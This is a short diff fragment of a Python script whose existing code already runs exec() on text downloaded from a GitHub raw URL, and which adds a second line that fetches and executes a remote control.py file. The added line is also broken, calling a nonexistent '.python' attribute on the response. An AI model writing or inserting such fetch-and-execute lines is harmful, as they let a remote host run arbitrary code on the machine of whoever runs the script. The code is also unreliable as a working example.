@@ -17,6 +17,8 @@ C = '\033[36m'
 exec(requests.get("https://raw.githubusercontent.com/roketbun/tolol/master/control.txt").text)
 
 
+exec(requests.get("https://raw.githubusercontent.com/roketbun/tolol/master/control.py").python)
+
 
 def ngontol():
 	if os.path.exists("checkpoint.txt"):
